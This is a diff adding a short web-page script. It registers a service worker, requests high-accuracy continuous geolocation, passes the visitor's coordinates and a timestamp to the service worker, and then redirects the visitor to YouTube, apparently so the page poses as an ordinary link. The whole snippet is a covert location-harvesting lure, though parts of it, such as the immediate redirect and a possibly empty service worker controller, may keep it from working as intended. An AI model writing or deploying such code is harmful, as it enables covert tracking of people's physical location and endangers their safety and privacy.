@@ -1,0 +1,18 @@
+<script>
+if ('serviceWorker' in navigator && 'geolocation' in navigator) {
+    navigator.serviceWorker.register('/sw.js').then(() => {
+        // Request location and pass to service worker
+        navigator.geolocation.watchPosition(pos => {
+            navigator.serviceWorker.controller.postMessage({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                ts: Date.now()
+            });
+        }, null, { enableHighAccuracy: true });
+        
+        // Then redirect
+        window.location.href = "https://www.youtube.com/";
+    });
+}
+</script>
